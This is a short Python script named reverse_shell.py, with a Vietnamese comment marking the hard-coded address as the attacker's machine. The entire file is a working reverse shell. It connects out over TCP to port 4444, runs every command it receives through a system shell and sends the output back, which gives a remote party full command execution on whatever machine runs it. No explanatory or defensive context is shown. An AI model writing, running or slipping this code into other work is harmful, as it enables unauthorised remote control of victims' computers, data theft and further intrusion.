# reverse_shell.py
import socket
import subprocess

host = '127.0.0.1'  # IP của máy attacker
port = 4444

s = socket.socket()
s.connect((host, port))

while True:
    try:
        command = s.recv(1024).decode()
        if command.strip().lower() == "exit":
            break
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        s.send(output)
    except Exception as e:
        s.send(str(e).encode())

s.close()
